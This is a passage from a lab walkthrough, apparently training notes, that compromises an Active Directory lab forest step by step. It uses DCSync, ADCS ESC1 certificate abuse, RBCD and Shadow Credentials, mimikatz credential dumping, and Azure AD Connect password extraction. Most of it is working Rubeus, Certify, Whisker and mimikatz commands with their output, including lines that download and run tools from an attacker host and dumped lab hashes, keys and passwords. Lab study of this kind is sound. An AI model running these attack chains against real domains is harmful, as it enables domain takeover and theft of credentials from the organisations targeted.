- We now have a TGT for the `us\us-dc$` account. Since this is a machine account and those accounts cannot be used to remotely access themselves, we can either abuse the S4U2Self Kerberos module to impersonate a high-privileged domain account on the domain controller and consequently compromise it, or import the TGT and execute a DCSync attack against the DC. This will allow us to dump domain accounts' credentials from the `ntds.dit`. For this attack we do not need to abuse S4U2self, since the TGT of the machine account `us\us-dc$` is sufficient.
```powershell
PS C:\Auditor> .\Rubeus.exe ptt /ticket:doIFv...

<snip>

PS C:\Auditor> .\mimikatz.exe

<snip>

mimikatz # lsadump::dcsync /user:decda /domain:us.techcorp.local
[DC] 'us.techcorp.local' will be the domain
[DC] 'US-DC.us.techcorp.local' will be the DC server
[DC] 'decda' will be the user account

Object RDN           : decda

** SAM ACCOUNT **

SAM Username         : decda
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/19/2019 11:16:05 AM
Object Security ID   : S-1-5-21-210670787-2521448726-163245708-1289
Object Relative ID   : 1289

Credentials:
  Hash NTLM: 068a0a7194f8884732e4f5a7cb47e17c
    ntlm- 0: 068a0a7194f8884732e4f5a7cb47e17c
    lm  - 0: f4c47f8d59894e3aafb8a5e30bfa87e8

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 904370f18b24552196ca8b95db809992

* Primary:Kerberos-Newer-Keys *
    Default Salt : US.TECHCORP.LOCALdecda
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0ab74eb8ff7bc902afacecf446f249a4757f550914331f32bacce14fd90988c5
      aes128_hmac       (4096) : c0787a6ca28e6aa19d4b9463267c4d2d
      des_cbc_md5       (4096) : 8c2a1fe0048686c4

* Primary:Kerberos *
    Default Salt : US.TECHCORP.LOCALdecda
    Credentials
      des_cbc_md5       : 8c2a1fe0048686c4

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  682c8f5d65c1a355e46488bf69a82288
    02  60ee66d71cf45bf6cc0558539ec13d51
    03  506042b10c360d588999eed024fba420

<snip>
```
# 13. Attacking ADCS - ESC1
- From the Enumeration phase we saw that PKI is set on the environment and ADCS is installed on `TECHCORP-DC` (Root DC).
- We also found a certificate that has the `ENROLLEE_SUPPLIES_SUBJECT` flag set, which means that we can use this template to request a certificate on behalf of any user we want. This Domain Escalation Method is described as **ESC1**.
- `us\pawadmin` has Enrollment Permissions on the vulnerable certificate template. Since we already have credentials and a certificate for that account, we can easily impersonate it and use it to request a certificate from the vulnerable template and elevate our privileges on the Domain.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:pawadmin /certificate:C:\Auditor\Loot\pawadmin.pfx /password:certpass /domain:us.techcorp.local /getcredentials /ptt

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 36EA28BFA97A992B5E85BD22485E8D52
```
- Alternatively, we can use the stolen NTLM hash of the account to request a TGT for that account.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:pawadmin /rc4:36ea28bfa97a992b5e85bd22485e8d52 /domain:us.techcorp.local /ptt

<snip>
```
- We can now request a certificate from the vulnerable template, however, we will do it on behalf of a high-privileged user. We can either request a certificate for the DA.
```powershell
PS C:\Auditor> .\Certify.exe request /ca:techcorp-dc.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : US\studentuser57
[*] No subject name specified, using current context as subject.

[*] Template                : ForAdminsofPrivilegedAccessWorkstations
[*] Subject                 : CN=studentuser57, CN=Users, DC=us, DC=techcorp, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : techcorp-dc.techcorp.local\TECHCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 49

<snip>
```
- We convert the `.pem` to `.pfx` and transfer the later to our machine.
```zsh
â”Œâ”€â”€(rootðŸ”±KaliVM)-[/home/â€¦/Desktop/Training/CRTE/Tools]
â””â”€# openssl pkcs12 -in administrator.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx
Enter Export Password:
Verifying - Enter Export Password:
```
- We can now use the certificate to request a TGT for `us\Administrator`.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:us\Administrator /certificate:C:\Auditor\Loot\administrator.pfx /password:certpass /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser57, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'us\Administrator'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

  ServiceName              :  krbtgt/us
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  12/4/2023 8:09:16 AM
  EndTime                  :  12/4/2023 6:09:16 PM
  RenewTill                :  12/11/2023 8:09:16 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  xUOvyyPvAJ7PDhdAx8GXjg==
  ASREP (key)              :  C3A653A3E938DC84FF93AF3B1244E082

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 43B70D2D979805F419E02882997F8F3F
PS C:\Auditor>
```
- We can now access `US-DC`.
```powershell
PS C:\Auditor> winrs -r:us-dc.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> whoami;hostname
whoami;hostname
us\administrator
US-DC
```
# 14. Rights, Privileges and Permissions of `us\mgmtadmin`
## 14.1 Access Rights
- We have extracted the credentials of `us\mgmtadmin` after compromising `US-MGMT` where the account has access.
## 14.2 Account Privileges
- This account has administrative privileges on `US-MGMT`.
## 14.3 Account Permissions
- From BloodHound we can see that `us\mgmtadmin` has `GenericWrite`  permissions on `US-HELPDESK`. Generic Write access grants us the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
![[mgmtadmin_perms.png]]
- We can abuse this by setting up the target server for `RBCD` which can be later be abused to request TGSs to access it, or execute a Shadow Credentials attack that will allow us to modify the target object's attribute `msDS-KeyCredentialLink` and append it with alternate credentials in the form of certificates.
### 14.3.1 Set up `US-HELPDESK` for RBCD and abuse it
#### 14.3.1.1 Using *Powermad*
- First we need to impersonate `us\mgmtadmin`. We have already compromised the account's NTLM hash so we can request a TGT using `Rubeus`.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:mgmtadmin /rc4:e53153fc2dc8d4c5a5839e46220717e5 /domain:us.techcorp.local /ptt

<snip>
```
- We can now use the permissions of the impersonated account to alter the `msds-allowedtoactonbehalfofotheridentity` attribute of the target account `us-helpdesk$` to point to the account of our compromised computer account, `us-mgmtadmin`. That way, we will create the conditions to execute an RBCD attack to compromise `US-HELPDESK`.
- Since we do not control an account with an SPN set currently, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account.
```powershell
PS C:\Auditor> ipmo .\Powermad\Powermad.ps1
PS C:\Auditor> New-MachineAccount -MachineAccount US-WRKST1 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
[+] Machine account US-WRKST1 added
PS C:\Auditor> ipmo .\PowerView.ps1
PS C:\Auditor> $ComputerSid = Get-DomainComputer US-WRKST1 -Properties objectsid | Select -Expand objectsid
PS C:\Auditor> echo $ComputerSid
S-1-5-21-210670787-2521448726-163245708-20101
PS C:\Auditor> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\Auditor> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Auditor> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Auditor> Get-DomainComputer us-helpdesk.us.techcorp.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
VERBOSE: [Get-DomainSearcher] search base:
LDAP://US-DC.US.TECHCORP.LOCAL/DC=US,DC=TECHCORP,DC=LOCAL
VERBOSE: [Get-DomainObject] Extracted domain 'us.techcorp.local' from
'CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local'
VERBOSE: [Get-DomainSearcher] search base:
LDAP://US-DC.US.TECHCORP.LOCAL/DC=us,DC=techcorp,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(distinguishedname=CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0
 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0
1 5 0 0 0 0 0 5 21 0 0 0 195 148 142 12 22 65 74 150 140 238 186 9 133 78 0 0' for object
'US-HELPDESK$'
```
- We are now ready to execute our attack. First we need the RC4 hash of the password of the computer account we created.
```powershell
PS C:\Auditor> .\Rubeus.exe hash /user:US-WRKST1$ /password:Password123! /domain:us.techcorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123!
[*] Input username             : US-WRKST1$
[*] Input domain               : us.techcorp.local
[*] Salt                       : US.TECHCORP.LOCALhostus-wrkst1.us.techcorp.local
[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
[*]       aes128_cts_hmac_sha1 : 88F9A7787D696543DE1517143F6F2ADC
[*]       aes256_cts_hmac_sha1 : 3A5C4C6613D724ED067F6D8476D83C8A63BE9AD1CE403A0048195F71E692F54E
[*]       des_cbc_md5          : 733B57B9EF858920
```
- Using the fake computer account we created, we will request a TGS for the service name we want to pretend to have administrative privileges for, as well as the user that we want to impersonate.
```powershell
PS C:\Auditor> .\Rubeus.exe s4u /user:us-wrkst1$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:Administrator /msdsspn:http/us-helpdesk.us.techcorp.local /nowrap /ptt

<snip>
```
- We can now disable the computer account we created for the attack. However, if we want to clean the `msds-allowedtoactonbehalfofotheridentity` attribute we will have to use `SharpAllowedToAct`.
```powershell
PS C:\Auditor> Disable-MachineAccount -MachineAccount US-WRKST1
[+] Machine account US-WRKST1 disabled
```
#### 14.3.1.1 Using *SharpAllowedToAct*
- We can also use `SharpAllowedToAct` to automate the attack. First we need to make sure that only the TGT for `us\mgmtadmin` is cached in our session's memory.
```powershell
PS C:\Auditor> .\SharpAllowedToAct.exe -m US-WRKST2 -p 'Password321!' -t US-HELPDESK -a US-DC -d us.techcorp.local
[+] Domain = us.techcorp.local
[+] Domain Controller = US-DC
[+] New SAMAccountName = US-WRKST2$
[+] Distinguished Name = CN=US-WRKST2,CN=Computers,DC=us,DC=techcorp,DC=local
[+] Machine account US-WRKST2 added
[+] SID of New Computer: S-1-5-21-210670787-2521448726-163245708-20102
[+] Attribute changed successfully
[+] Done!
```
- We will need to find the RC4 hash of `us-wrkst2$` in order to impersonate the account.
```powershell
PS C:\Auditor> .\Rubeus.exe hash /user:US-WRKST2 /password:'Password321!' /domain:us.techcorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password321!
[*] Input username             : US-WRKST2
[*] Input domain               : us.techcorp.local
[*] Salt                       : US.TECHCORP.LOCALUS-WRKST2
[*]       rc4_hmac             : 13B1E64400203ECF38B1FDEA2B11A09F
[*]       aes128_cts_hmac_sha1 : F1B7E1173F550F5EF2BC189C57004B13
[*]       aes256_cts_hmac_sha1 : 6BDA42EC413F38F6788E873E0C834D18F27908C7EFFB5A077C7463AB6526C143
[*]       des_cbc_md5          : 3B23E3984F5B07BF
```
- We will now use the S4U Kerberos extension to request a a TGS for the service name we want impersonating a user with administrative privileges.
```powershell
PS C:\Auditor> .\Rubeus.exe s4u /user:us-wrkst2$ /rc4:13B1E64400203ECF38B1FDEA2B11A09F /impersonateuser:Administrator /msdsspn:http/us-helpdesk.us.techcorp.local /nowrap /ptt

<snip>
```
- We can now access the compromised server.
```powershell
PS C:\Auditor> winrs -r:us-helpdesk.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.US> whoami;hostname
whoami;hostname
us\administrator
US-HelpDesk
```
- We can now clear the `msds-allowedtoactonbehalfofotheridentity` attribute of the compromised server. First we will need to clean our Kerberos tickets and request a TGT for `us\mgmtadmin`, since this account has `GenericWrite` permissions over `US-HELPDESK`. However, if we want to disable the computer account we created for the attack, we will need to use `Powermad`.
```powershell
PS C:\Auditor> .\Rubeus.exe purge
PS C:\Auditor> .\Rubeus.exe asktgt /user:mgmtadmin /rc4:e53153fc2dc8d4c5a5839e46220717e5 /domain:us.techcorp.local /ptt

<snip>

PS C:\Auditor> .\SharpAllowedToAct.exe -c true -t US-HELPDESK
[+] Clearing attribute...
[+] Attribute changed successfully
[+] Done!
```
### 14.3.2 Shadow Credentials
- This attack is way more stealthy and also easier to execute.
- We will use the `cb\mgmtadmin` GenericWrite permissions over `us\us-helpdesk$` to modify the target account's `msDS-KeyCredentialLink` attribute and append it with alternate credentials in the form of certificates.
- First we will list the `msDS-KeyCredentialLink` attribute of the target server.
```powershell
PS C:\Auditor> .\Whisker.exe list /target:us-helpdesk$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local
[*] Searching for the target account
[*] Target user found: CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
[*] Listing deviced for us-helpdesk$:
[*] No entries!
```
- Now we will modify the attribute.
```powershell
PS C:\Auditor> .\Whisker.exe add /target:us-helpdesk$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password oApSTLuBSHPqoxHf
[*] Searching for the target account
[*] Target user found: CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 4f287cab-3f87-4a31-ba6e-a595586af3f5
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ2AI...
```
- Let's verify that the attribute has indeed been modified. We will also need the `DeviceID` attribute to perform the cleanup after the attack.
```powershell
PS C:\Auditor> .\Whisker.exe list /target:us-helpdesk$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local
[*] Searching for the target account
[*] Target user found: CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
[*] Listing deviced for us-helpdesk$:
    DeviceID: 4f287cab-3f87-4a31-ba6e-a595586af3f5 | Creation Time: 12/4/2023 11:37:42 AM
```
- Let's use the generated certificate to request a TGT as `us\us-helpdesk$`. In the generated command above we have added the `/ptt` and `/nowrap` options for our convenience.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ2AI... /password:"oApSTLuBSHPqoxHf" /domain:us.techcorp.local /dc:us-dc.us.techcorp.local /getcredentials /show /nowrap /ptt

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 76C3848CC2E34EF0A8B5751F7E886B8E
```
- We will now use the generated TGT to execute a S4U2Self attack to impersonate `us\administrator` and request a TGS for the `HTTP` service.
```powershell
PS C:\Auditor> .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:http/us-helpdesk.us.techcorp.local /dc:us-dc.us.techcorp.local /ptt /nowrap /ticket:doIG...
```
- We can now access the compromised server.
```powershell
PS C:\Auditor> winrs -r:us-helpdesk.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.US> whoami;hostname
whoami;hostname
us\administrator
US-HelpDesk
```
- After pillaging the compromised server, we can exit, clear our Kerberos tickets from our cache and impersonate `us\mgmtadmin` again in order to clean up the `msDS-KeyCredentialLink` attribute of the target server. In the end we will list the attribute again to make sure we have properly performed our cleanup.
```powershell
PS C:\Auditor> .\Rubeus.exe purge
PS C:\Auditor> .\Rubeus.exe asktgt /user:mgmtadmin /rc4:e53153fc2dc8d4c5a5839e46220717e5 /domain:us.techcorp.local /ptt

<snip>

PS C:\Auditor> .\Whisker.exe clear /target:us-helpdesk$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local
[*] Searching for the target account
[*] Target user found: CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
PS C:\Auditor> .\Whisker.exe list /target:us-helpdesk$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local
[*] Searching for the target account
[*] Target user found: CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
[*] Listing deviced for us-helpdesk$:
[*] No entries!
```
# 15. Extracting Credentials and Tokens from `US-HELPDESK`
- Using one of the attacks described at [[2. Lab Walkthrough/1st Forest (techcorp.local)/1. us.techcorp.local/2. Kill Chain#14.3 Account Permissions]], we can now access `US-HELPDESK` with administrative privileges.
```powershell
PS C:\Auditor> winrs -r:us-helpdesk.us.techcorp.local powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.US> hostname;whoami
hostname;whoami
US-HelpDesk
us\administrator
```
- We can attempt to steal credentials and tokens from the compromised server.
```powershell
PS C:\Windows\Tasks> wget http://192.168.100.57/mimikatz.exe -O mimikatz.exe
wget http://192.168.100.57/mimikatz.exe -O mimikatz.exe
PS C:\Windows\Tasks> .\mimikatz.exe
.\mimikatz.exe

<snip>

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

632     {0;000003e7} 1 D 23027          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;013632c1} 0 D 20515782    US\Administrator        S-1-5-21-210670787-2521448726-163245708-500     (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20596014    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1324275 (00000000:001434f3)
Session           : RemoteInteractive from 2
User Name         : helpdeskadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:03:21 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1120
        msv :
         [00000003] Primary
         * Username : helpdeskadmin
         * Domain   : US
         * NTLM     : 94b4a7961bb45377f6e7951b0d8630be
         * SHA1     : c13e73f3c1cccfb0e6b730afab4d2bd211e2af97
         * DPAPI    : 2b21c39dca16e98467e116b7c1d3eb4c
        tspkg :
        wdigest :
         * Username : helpdeskadmin
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : helpdeskadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1251635 (00000000:00131933)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 2:59:29 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : US-HELPDESK$
         * Domain   : US
         * NTLM     : 76c3848cc2e34ef0a8b5751f7e886b8e
         * SHA1     : 5358fe9870790deeb4ddda29a49863e48d1e5707
        tspkg :
        wdigest :
         * Username : US-HELPDESK$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-HELPDESK$
         * Domain   : us.techcorp.local
         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
        ssp :
        credman :

<snip>
```
# 16. Rights, Privileges and Permissions of `us\helpdeskadmin`
## 16.1 Access Rights
- Having compromised the credentials of `us\helpdeskadmin`, we can start enumerating for further access rights to any new domain resources.
```powershell
PS C:\Auditor> ipmo .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Auditor> Find-PSRemotingLocalAdminAccess
US-HelpDesk
US-ADConnect
```
## 16.2 Account Privileges
- This account has administrative privileges on `US-HELPDESK` and `US-ADCONNECT`.
## 16.3 Account Permissions
- This account does not have any interesting permissions.
# 17. Extracting Credentials and Tokens from `US-ADCONNECT`
- We can access `US-ADCONNECT` and steal credentials and tokens.
```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

<snip>

mimikatz # sekurlsa::logonpasswords


Authentication Id : 0 ; 1337758 (00000000:0014699e)
Session           : RemoteInteractive from 2
User Name         : adconnect
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:02:05 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1114
        msv :
         [00000003] Primary
         * Username : adconnect
         * Domain   : US
         * NTLM     : 4e150424ccf419d83ce3a8ad1db7b94a
         * SHA1     : c1d2b29ae62d1e329f50df0523c8f8247d7d680c
         * DPAPI    : 10e96b0582456009d1d8733ca2f05b31
        tspkg :
        wdigest :
         * Username : adconnect
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : adconnect
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1255173 (00000000:00132705)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 2:59:31 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : US-ADCONNECT$
         * Domain   : US
         * NTLM     : 093f64d9208f2b546a3b487388b2b34a
         * SHA1     : 8d682e45f4ae9d21a1b8900e3b5095e327111f94
        tspkg :
        wdigest :
         * Username : US-ADCONNECT$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : US-ADCONNECT$
         * Domain   : us.techcorp.local
         * Password : \wrh:@r[=ImzK%5I]fht 9<KT$lBOD6\YPHGW0cfLM,vGbR)jVa;N, v)'cIH'qm5owfr1W5m_ZNpyD[cw 7I4]/f/!/p^y=Z[ina+&5ytV!f0l&mk\KJ5A4
        ssp :
        credman :
```
- The name of the server (`US-ADCONNECT`) and the name of the compromised account (`us\adconnect`) are interesting. **Azure AD Connect**Â is a tool for connecting and synchronizing on-premises objects present in Active Directory to a corresponding [Microsoft Azure AD](https://en.wikipedia.org/wiki/Microsoft_Azure_Active_Directory) service within a Microsoft 365 tenant.
- Attack vectors with a focus on AD Connect exist. The most targeted mechanism is _Password Hash Sync_. This method shares users and their password hashes from on-premises AD to Azure AD. A new users MSOL_ is created which has Synchronization rights (DCSync) on the domain. It's the **most common method** used by companies to synchronize an on-prem AD with Azure AD.
- When PHS is configured some **privileged accounts** are automatically **created**:
	- The account `**MSOL_<installationID>**` is automatically created in on-prem AD. This account is given a **Directory Synchronization Accounts** role (see [documentation](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) which means that it has **replication (DCSync) permissions in the on-prem AD**.
	- An account `**Sync_<name of on-prem ADConnect Server>_installationID**` is created in Azure AD. This account can **reset password of ANY user** (synced or cloud only) in Azure AD.
- Passwords of the two previous privileged accounts are **stored in a SQL server** on the server where **Azure AD Connect is installed.** Admins can extract the passwords of those privileged users in clear-text.
- If the **server where Azure AD connect is installed** is domain joined (recommended in the docs), it's possible to find it.
- We will use **PowerView** to query the Root Domain for the target user.
```powershell
PS C:\Auditor> Get-DomainUser -Domain techcorp.local -Properties * | Where-Object -Property samaccountname -like 'MSOL_*' | select SamAccountName,Description | fl


samaccountname : MSOL_16fb75d0227d
description    : Account created by Microsoft Azure Active Directory Connect with installation identifier 16fb75d0227d4957868d5c4ae0688943
                 running on computer US-ADCONNECT configured to synchronize to tenant techcorpus.onmicrosoft.com. This account must have
                 directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid
                 Deployment.
```
- We have discovered the target user. Our goal now is to extract cleartext credentials for `MSOL_16fb75d0227d`, since this account has DCSync permissions on the Parent Domain.
- We will impersonate `us\adconnect` and access `US-ADCONNECT` as that domain user. After that, we will extract the plaintext credentials of `techcorp\MSOL_16fb75d0227d` using **ADConnect**.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:adconnect /rc4:4e150424ccf419d83ce3a8ad1db7b94a /domain:us.techcorp.local /ptt

<snip>

PS C:\Users\adconnect> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.57/adconnect.ps1')
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.57/adconnect.ps1')
PS C:\Users\adconnect> ADConnect
ADConnect
AD Connect Sync Credential Extract POC (@_xpn_)

AD Connect Sync Credential Extract v2 (@_xpn_)
        [ Updated to support new cryptokey storage method ]

[*] Querying ADSync localdb (mms_server_configuration)
[*] Querying ADSync localdb (mms_management_agent)
[*] Using xp_cmdshell to run some Powershell as the service user
[*] Credentials incoming...

Domain: techcorp.local
Username: MSOL_16fb75d0227d
Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
```
- We can now request a TGT for `MSOL_16fb75d0227d` to impersonate the account and execute a DCSync attack on any Domain on our Forest.
```powershell
PS C:\Auditor> .\Rubeus.exe asktgt /user:MSOL_16fb75d0227d /password:'70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf' /domain:techcorp.local /ptt

<snip>

PS C:\Auditor> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local
[DC] 'techcorp.local' will be the domain
[DC] 'Techcorp-DC.techcorp.local' will be the DC server
[DC] 'techcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/4/2019 1:52:52 AM
Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 7735b8be1edda5deea6bfbacb7f2c3e7
    ntlm- 0: 7735b8be1edda5deea6bfbacb7f2c3e7
    lm  - 0: 295fa3fef874b54f29fd097c204220f0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9fe386f0ebd8045b1826f80e3af94aed

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECHCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 290ab2e5a0592c76b7fcc5612ab489e9663e39d2b2306e053c8b09df39afae52
      aes128_hmac       (4096) : ac670a0db8f81733cdc7ea839187d024
      des_cbc_md5       (4096) : 977526ab75ea8691
```
# 18. Abusing MSSQL at `US-MSSQL`
- From [[2. Lab Walkthrough/1st Forest (techcorp.local)/1. us.techcorp.local/1. Domain Enumeration|1. Domain Enumeration]] we discovered a MSSQL server on `us.techcorp.local`. We can try to access it using our initial account, `us\studentuser57`. We will use **PowerUpSQL** to enumerate and possibly exploit the database.
```powershell
PS C:\Auditor> Get-SQLInstanceDomain -Verbose
VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)...
VERBOSE: Parsing SQL Server instances from SPNs...
VERBOSE: 1 instances were found.


ComputerName     : us-mssql.us.techcorp.local
